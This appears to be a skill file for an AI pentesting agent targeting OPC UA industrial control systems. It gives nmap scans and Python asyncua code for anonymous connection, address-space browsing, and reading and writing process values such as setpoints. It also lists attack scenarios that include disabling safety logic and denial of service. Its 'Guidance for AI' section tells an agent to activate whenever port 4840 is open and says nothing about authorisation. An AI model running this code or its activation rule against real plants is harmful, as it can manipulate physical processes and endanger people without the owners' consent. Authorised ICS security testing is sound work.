# OPC UA Pentesting Skill

## Goal

Identify and exploit vulnerabilities in OPC UA (Unified Architecture) industrial communication systems.

## Ports

- **4840** - OPC UA (default)
- **48400** - OPC UA (alternate)

## Methodology

1. **Identify OPC UA:** Scan for port 4840
2. **Check Authentication:** Test for anonymous access
3. **Enumerate Endpoints:** list available security policies
4. **Browse Nodes:** Explore the address space
5. **Read/Write Values:** Access industrial data

## Enumeration

```bash
# Nmap scan
nmap -sV -p 4840 <target>

# Check for OPC UA
nmap -p 4840 --script opcua-info <target>
```

## Endpoint Discovery

```python
# Using opcua-asyncio
from asyncua import Client

async def enumerate():
    client = Client("opc.tcp://<target>:4840")
    
    # Get endpoints
    endpoints = await client.get_endpoints()
    for ep in endpoints:
        print(f"Endpoint: {ep.EndpointUrl}")
        print(f"Security: {ep.SecurityPolicyUri}")
        print(f"Mode: {ep.SecurityMode}")
```

## Security Policies

```
# Common policies (weakest to strongest)
None                           # No security
Basic128Rsa15                  # Deprecated
Basic256                       # Weak
Basic256Sha256                 # Recommended
Aes128_Sha256_RsaOaep         # Strong
Aes256_Sha256_RsaPss          # Strongest
```

## Anonymous Access

```python
# Connect anonymously
from asyncua import Client

async def connect():
    client = Client("opc.tcp://<target>:4840")
    client.set_security_string("None")  # No security
    await client.connect()
    
    # Browse root
    root = client.get_root_node()
    objects = await root.get_children()
```

## Browsing Address Space

```python
async def browse():
    client = Client("opc.tcp://<target>:4840")
    await client.connect()
    
    # Get Objects folder
    objects = client.get_objects_node()
    
    # Recursive browse
    async def browse_node(node, level=0):
        name = await node.read_display_name()
        print("  " * level + name.Text)
        children = await node.get_children()
        for child in children:
            await browse_node(child, level + 1)
    
    await browse_node(objects)
```

## Reading Values

```python
async def read_values():
    client = Client("opc.tcp://<target>:4840")
    await client.connect()
    
    # Read by NodeId
    node = client.get_node("ns=2;s=Temperature")
    value = await node.read_value()
    print(f"Temperature: {value}")
    
    # Read multiple
    nodes = [
        client.get_node("ns=2;s=Temperature"),
        client.get_node("ns=2;s=Pressure")
    ]
    values = await client.read_values(nodes)
```

## Writing Values

```python
# Write to node (DANGEROUS - affects physical processes)
async def write_value():
    client = Client("opc.tcp://<target>:4840")
    await client.connect()
    
    node = client.get_node("ns=2;s=Setpoint")
    await node.write_value(75.0)
```

## Historical Data Access

```python
# Read historical data
async def read_history():
    node = client.get_node("ns=2;s=Temperature")
    history = await node.read_raw_history(
        start=datetime.utcnow() - timedelta(hours=1),
        end=datetime.utcnow()
    )
```

## Attack Scenarios

```bash
# Reconnaissance
- Browse entire address space
- Enumerate users and roles
- Read sensitive parameter values

# Process Manipulation
- Modify setpoints
- Change operating modes
- Disable safety logic

# Denial of Service
- Subscription flooding
- Certificate spam
```

## Tools

* **opcua-asyncio** - Python OPC UA library
* **UaExpert** - GUI OPC UA client
* **FreeOpcUa** - Open source OPC UA
* **Nmap** - OPC UA scripts

## Guidance for AI

* Activate when port 4840 is open
* OPC UA is modern industrial protocol (successor to OPC)
* Check for None security policy (anonymous access)
* Address space reveals complete system topology
* Write operations directly affect physical processes
* Industrial systems require extreme caution during testing
